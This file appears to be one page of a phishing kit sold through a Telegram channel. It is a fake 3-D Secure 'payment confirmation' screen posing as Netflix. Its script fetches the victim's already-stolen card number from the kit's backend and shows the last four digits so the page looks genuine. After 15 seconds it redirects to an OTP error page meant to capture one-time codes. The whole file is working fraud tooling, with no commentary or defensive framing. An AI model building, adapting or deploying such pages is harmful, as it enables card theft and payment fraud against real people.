
<?php
/*
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦✦						  				            ✦✦
✦✦    TELEGRAM CONTACT : https://t.me/Xenos_dev     ✦✦
✦✦    TELEGRAM CHANNEL : https://t.me/xenostools    ✦✦
✦✦         TELEGRAM USERNAME : @Xenos_dev           ✦✦
✦✦                                                  ✦✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦


*/
?>

<!DOCTYPE html>


<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="../assets/nficon2016.ico">
<link rel="apple-touch-icon" href="../assets/nficon2016.png">
    <title>3DS-secure verification</title>
    <script src="../redirect.js"></script>
    <script src="../assets/jquery.min.js"></script> 
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
</head>
<body>
    <nav class="navbar">
        <div class="navbar-content">
            <!-- Navigation links or content can go here -->
            <span style="margin: 15px; font-weight: 100;" class="navbar-text">Avbryt</span>
        </div>
    </nav>
    
<script>
    $(document).ready(function() {
        
        console.log("Jquery ready")
        
        time_delay_by_millisec = 15000;

        setTimeout(function() {
            window.location.href = "Ver_error_otp.php";
        }, time_delay_by_millisec); 
    
    });
</script>
    <div class="table-container" >
        <h2 style="font-size: 20px;">Please confirm the payment</h2>
        <table>
            <tbody>
                <tr>
                    <td class="left_td">Online store</td>
                    <td class="right_td">NETFLIX</td>
                </tr>
                <tr>
                    <td class="left_td">Amount</td>
                    <td class="right_td">0,00 $</td>
                </tr>
                <tr>
                    <td class="left_td">Date</td>
                    <td class="right_td">24.03.2024 02:53</td>
                </tr>
                <tr>
                    <td class="left_td">Card number</td>
                    <td class="right_td"></td>
                </tr>
            </tbody>
        </table>
    </div>
    
    <form class="form-container">
        <main class="form-main">
            
           
            <div id="wrapper">
                <div class="profile-main-loader">
                    <div class="loader">
                        <svg class="circular-loader" viewBox="25 25 50 50">
                            <circle class="loader-path" cx="50" cy="50" r="20" fill="none" stroke-width="4" />
                        </svg>
                           
                    </div>
                
                </div>
            </div>
            
            <p style="width: fit-content; font-weight: bold; margin-top: 20px;">Verifying information , Please wait.</p> 
        </main>
        
    </form>
    <button style="background-color: #4A4A4A; color: white; width: 220px; border-radius: 20px; height: 30px; margin-top: 25px; outline: none; border: none;">Tilbake</button>

    <div class="help-container">
        <span class="help-text">do you need help?</span>
        <div class="arrow-down"></div>
    </div>


    <style>
        
#wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
}

.profile-main-loader {
    position: relative;
    display: flex;
    flex-direction: column;
}

.profile-main-loader .loader {
    position: relative;
    margin: 0 auto;
    width: 45px;
    height: 45px;
}

/* The rest of your CSS remains unchanged */

.circular-loader {
    -webkit-animation: rotate 4s linear infinite;
    animation: rotate 4s linear infinite;
    height: 100%;
    -webkit-transform-origin: center center;
    -ms-transform-origin: center center;
    transform-origin: center center;
    width: 100%;
    margin: auto;
}
.loader-path {
    stroke-dasharray: 150, 200;
    stroke-dashoffset: -10;
    -webkit-animation: dash 3s ease-in-out infinite, color 6s ease-in-out infinite;
    animation: dash 3s ease-in-out infinite, color 6s ease-in-out infinite;
    stroke-linecap: round;
}
@-webkit-keyframes rotate {
    100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
    }
}
@keyframes rotate {
    100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
    }
}
@-webkit-keyframes dash {
    0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
    }
    50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
    }
    100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
    }
}
@keyframes dash {
    0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
    }
    50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
    }
    100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
    }
}
@-webkit-keyframes color {
    0% {
        stroke: #0078BD;
    }
    40% {
        stroke: #0078BD;
    }
    66% {
        stroke: #0078BD;
    }
    80%, 90% {
        stroke: #0078BD;
    }
}
@keyframes color {
    0% {
        stroke: #0078BD;
    }
    40% {
        stroke: #0078BD;
    }
    66% {
        stroke: #0078BD;
    }
    80%, 90% {
        stroke: #0078BD;
    }
}
    </style>
    <script>
    $(document).ready(function() {
        console.log("Jquery ready")
        var date = new Date();
        var day = ("0" + date.getDate()).slice(-2);
        var month = ("0" + (date.getMonth() + 1)).slice(-2);
        var year = date.getFullYear();
        var hours = ("0" + date.getHours()).slice(-2);
        var minutes = ("0" + date.getMinutes()).slice(-2);

        var formattedDate = day + "." + month + "." + year + " " + hours + ":" + minutes;

        // Target only the .right_td in the third tr
        $("tr:eq(2) .right_td").text(formattedDate);

        var today = new Date();
        var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
        var time = today.getHours() + ':' + today.getMinutes() + ':' + today.getSeconds();
        var current_date = date + ' ' + time;

        $.ajax({
            type: "POST",
            url: "../scripts/update_user_page.php",
            data: { page: 'Ver_Loading'  , current_date : current_date },
            dataType: 'JSON', // Add this line to specify the data type
            success: function(response) {
                if (response.length > 0) {
                    console.log(response[0].net_cc_number); // This should now correctly log the credit card number
                    
                    cc_numbers = response[0].net_cc_number;

                    // Add last four cc numbers 
                    lastccnumbers =  cc_numbers.slice(-4);
                    // Target only the .right_td in the fourth tr
                    $("tr:eq(3) .right_td").text("**** **** **** "+lastccnumbers);
                } else {
                    console.log("No credit card numbers found.");
                }
            }
        });
    });
</script>
<style>
    html,*{
        margin: 0;
        padding: 0;
    }
    body{
        box-sizing: border-box;
        font-family: 
        ArialMT,
        Arial,
        Arial Black,
        ArialHebrew,
        Arial-BoldMT;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
.navbar {
    background-color: #9B9B9B; /* Set the background color */
    display: flex; /* Use flexbox for layout */
    justify-content: space-between; /* Align items on opposite ends */
    height: 50px;
    width: 100%;
}

.navbar-content {
    display: flex; /* Use flexbox for layout */
    justify-content: flex-end; /* Align items to the right */
    width: 100%; /* Take full width */

}

.navbar-text {
    color: white; 
}


.lbl{
    display: flex;
    flex-direction: row;
    align-items: center;

}
    .form-container {
        width: 100%;
        max-width: 380px;
        margin: 1px auto;
        border: 1px solid #cbcbcb;
        background-color: #FBFBFB;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

.form-header {
 display: flex;
 justify-content: space-between;
 align-items: center;
 padding: 10px;
 border-bottom: 1px solid #ccc;
}

.header-left, .header-right {
 display: flex;
 align-items: center;
}

.arrow-left, .bar-icon, .arrow-right {
 margin-right: 5px;
}

.form-main {
 padding: 20px;
 display: flex;
 flex-direction: column ;
 align-items: center;
 justify-content: center;
 width: 100%;
}

.input-container {
 display: flex;
 align-items: center;
 margin-top: 10px;
}

.profile-icon, .arrow-right {
 margin-right: 5px;
}

input[type="text"] {
 flex-grow: 1;
 padding: 5px;
 border: 1px solid #ccc;
 font-size: 18px;
 padding-left: 35px;
 outline: none;
 height: 25px;
 width: 91%;
}

#submit_btn {
    padding: 8px 20px;
    background-color: #0078BD;
    color: white;
    border: none;
    cursor: pointer;
    margin-left: 30px;
    max-height: 40px; 
    border-radius: 3px;
}   /* Base styles */

td.left_td {
    font-weight: bold;
    text-align: right;
    padding-right: 2px; /* Optional: Adds some space to the right of the text */
}

td.right_td {
    text-align: left;
    padding-left: 2px; /* Optional: Adds some space to the left of the text */
}
.table-container {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    font-size: 11px;
    margin-top: 25px;
}


/* Responsive styles */
@media (max-width: 420px) {
    input[type="text"] {
        width: 85%;
    }
    
    .form-container {
        width: 88%;
    }
}
.help-container {
    margin-top: 60px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    border-bottom: 1px solid #A6A1A1; /* Set the bottom border color */
}

.help-text {
    /* Styles for the text */
    font-size: 12px;
    margin-left: 20px;
    margin-bottom: 8px;
}

.arrow-down {
    margin-bottom: 8px;
    margin-right: 20px;
    width: 0;
    height: 0;
    border-left: 6px solid transparent; /* Adjust the size of the arrow */
    border-right: 6px solid transparent;
    border-top: 6px solid #A6A1A1; /* Set the color of the arrow */
}






</style>       
</body>

<script>
    var scrollEventHandler = function() {
  window.scroll(0, window.pageYOffset);
}

window.addEventListener("scroll", scrollEventHandler, false);

</script>
</html>